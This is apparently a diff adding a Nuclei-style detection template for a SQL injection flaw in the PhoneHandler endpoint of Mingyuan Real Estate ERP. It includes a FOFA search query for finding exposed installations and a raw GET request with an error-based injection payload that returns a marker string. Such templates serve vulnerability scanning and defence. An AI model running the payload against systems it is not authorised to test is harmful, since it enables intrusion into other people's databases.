@@ -1,0 +1,31 @@
+id: mydc-erp-PhoneHandler-sqli
+info:
+  name: 明源地产 ERP PhoneHandler - sqli
+  author: leadlife
+  severity: high
+  description: 明源地产 ERP PhoneHandler 接口SQL注入漏洞，该漏洞允许攻击者在应用程序的数据库查询中注入恶意的SQL代码。通常发生在应用程序未对用户输入进行充分验证和过滤。
+  reference: 
+    - changting
+  classification:
+    cve-id: 
+  metadata:
+    verified: true
+    fofa-query: title="明源地产ERP" && icon_hash="-1520670993"
+    hunter-query: demo
+    tips:
+    repair:
+    version:
+  tags: 2024,mydc,erp,sqli
+
+http:
+  - raw:
+      - |
+        GET /Hkbgl/PhoneWorkflow/Business/PhoneHandler.ashx?type=3&BusinessGUID=a%27+and+CONVERT%28varchar%28MAX%29%2C+0x7761747568667362%2C+0%29%3E1-- HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 302
+          - contains_all(body,'varchar','watuhfsb')
+        condition: and
